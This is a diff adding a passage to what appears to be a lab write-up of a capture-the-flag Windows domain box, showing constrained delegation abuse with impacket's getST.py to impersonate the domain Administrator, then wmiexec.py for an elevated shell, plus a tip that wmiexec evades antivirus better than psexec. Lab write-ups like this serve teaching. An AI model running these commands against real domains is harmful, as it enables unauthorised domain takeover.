@@ -199,3 +199,35 @@ Next we pwn our main target DARLA_WINTERS
 
 ## constrained delegation abuse
 
+Now we have pwned DARLA_WINTERS we can set about exploiting the constrained delegation associated with that account. This can again be achieved from our attacking machine. Ultimately, we obtain kerberos authentication credentials for the Administrator user who bloodhound showed to be a domain admin.
+
+`sudo python3 getST.py -k -impersonate Administrator -spn cifs/HayStack.thm.corp/DARLA_WINTERS`
+
+![cdeleg1](/images/24.png)
+
+`export KRB5CCNAME=Administrator.ccache`
+
+![cdeleg2](/images/24b.png)
+
+![cdeleg3](/images/24c.png)
+
+---
+
+## getting root
+
+We can now use *wmiexec.py* from the *impacket* suite of tools to gain an elevated shell on the haystack machine - *psexec.py* does not work - it is probably picked up by antivirus. If *psexec* does not work it is always worth trying *wmiexec* as it tends to not get picked up as much.
+
+`sudo python3 wmiexec.py -k -no-pass Administrator@Haystack.thm.corp`
+
+![root1](/images/25.png)
+
+![root2](/images/26.png)
+
+We have now pwned 💀 the reset box! 🥳
+
+But the party is not over yet... 😈
+
+---
+
+## the automate user
+
